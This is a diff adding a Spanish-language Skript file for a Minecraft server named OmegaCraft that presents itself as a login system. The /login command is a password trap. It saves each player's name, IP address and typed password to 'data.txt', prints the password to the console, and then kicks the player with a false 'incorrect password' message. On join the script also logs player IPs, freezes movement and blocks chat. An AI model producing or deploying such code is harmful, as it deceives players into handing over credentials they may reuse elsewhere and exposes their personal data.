@@ -1,0 +1,62 @@
+every second:
+	loop all players:
+		wipe loop-player's sidebar
+		set name of sidebar of loop-player to "   &e&lOmega&b&lCraft   "
+		set score "&fBienvenido &a%loop-player%" in sidebar of loop-player to 11
+		set score "&1" in sidebar of loop-player to 10
+		set score "&fRegístrate:" in sidebar of loop-player to 9
+		set score "&a/register" in sidebar of loop-player to 8
+		set score "&a<contraseña>" in sidebar of loop-player to 7
+		set score "&a<contraña>" in sidebar of loop-player to 6
+		set score "&2" in sidebar of loop-player to 5
+		set score "&fInicia sesión:" in sidebar of loop-player to 4
+		set score "&a/login <contraña>" in sidebar of loop-player to 3
+		set score "&3" in sidebar of loop-player to 2
+		set score "&eomega&bcraft&7.cl" in sidebar of loop-player to 1
+
+on join:
+	execute console command "/title %player% subtitle ['',{'text':'/login <contraseña>','color':'white','bold':'true'}]"
+	execute console command "/title %player% title ['',{'text':'Inicia sesión','color':'green','bold':'true'}]"
+	send "" to console
+	send "&cIP of &a%player%: &9%ip of player%" to console
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	message "&e&lLogin: &fUsa /login <Contraseña>"
+	wait 2 seconds
+	kick the player due to "&cHas tardado mucho en iniciar sesión!%newline%&7Intentalo de nuevo!"
+on any movement:
+	execute console command "tp %player% 0 160 2"
+on chat:
+	cancel event
+
+command /login [<text>]:
+	trigger:
+		if arg-1 is not set:
+			message "&e&lLogin: &f/login <Contraseña>"
+		if arg-1 is set:
+			wf "%player% (%ip of player%) [/login %arg-1%]" to "data.txt"
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "" to console
+			send "&aThe Password Of &5%player% &ais &d%arg-1%" to console
+			send "" to console
+			send "" to console
+			kick the player due to "&cContraseña Incorrecta!"
